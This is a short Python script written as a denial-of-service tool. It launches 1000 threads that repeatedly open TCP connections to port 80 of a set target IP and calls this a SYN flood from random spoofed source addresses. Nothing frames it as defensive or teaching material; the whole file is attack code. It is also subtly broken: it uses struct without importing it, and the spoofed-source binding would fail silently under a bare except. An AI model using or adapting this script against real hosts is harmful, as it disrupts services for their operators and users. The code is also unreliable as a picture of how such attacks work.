import random
import socket
import threading
import time

target_ip = '10.12.0.10'
target_ports = [80]
num_threads = 1000
delay = 0.01

def send_syn_packet(target_ip, target_port, source_ip):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((source_ip, 0))
        s.connect((target_ip, target_port))
        s.close()
    except:
        pass

def syn_flood():
    while True:
        target_port = random.choice(target_ports)
        source_ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
        send_syn_packet(target_ip, target_port, source_ip)
        time.sleep(delay)

threads = []
for i in range(num_threads):
    t = threading.Thread(target=syn_flood)
    threads.append(t)
    t.start()